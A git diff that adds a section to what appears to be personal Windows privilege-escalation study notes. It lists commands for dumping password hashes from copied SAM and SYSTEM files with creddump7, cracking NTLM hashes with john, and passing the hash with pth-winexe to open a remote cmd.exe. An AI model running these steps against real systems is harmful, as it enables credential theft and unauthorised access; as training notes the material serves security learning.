@@ -410,6 +410,46 @@ When this registry key is enabled, it allows non-administrator users to install 
  ![image](https://github.com/user-attachments/assets/d1dedfcb-0c29-4d1d-8326-8de66e43a93f)
 
        
+### Paaswords- Security Acount Manager (SAM)
+
+- The SAM and SYSTEM files can be used to extract user password hashes
+- Copy it to your machine
+
+![image](https://github.com/user-attachments/assets/54334d3b-cc07-4119-83cd-f372acd2db77)
+
+- Install credump7 to dump the hashes
+
+      git clone https://github.com/Tib3rius/creddump7
+      pip3 install pycrypto
+      python3 creddump7/pwdump.py SYSTEM SAM
+
+- Dump the hashes with pwdump.py
+
+![image](https://github.com/user-attachments/assets/197fbbb0-c037-4ef0-b2db-62af6d48163d)
+
+- Crack the NTLM(New Technology Lan Manager) hash with john
+
+![image](https://github.com/user-attachments/assets/d9316e5c-d530-4b5c-a4e9-b0e2f2ebf4ca)
+
+### Passing the hash
+
+- You can use the hash to login instead of cracking the password,use `pth-winexe`
+
+       pth-winexe -U "admin%[hash]" //[ip] cmd.exe
+
+- Remember that the hash contains both the LM and NTLM hash seperated by colon
+
+![Uploading image.png…]()
+
+
+
+
+
+
+
+
+
+
 
 
 
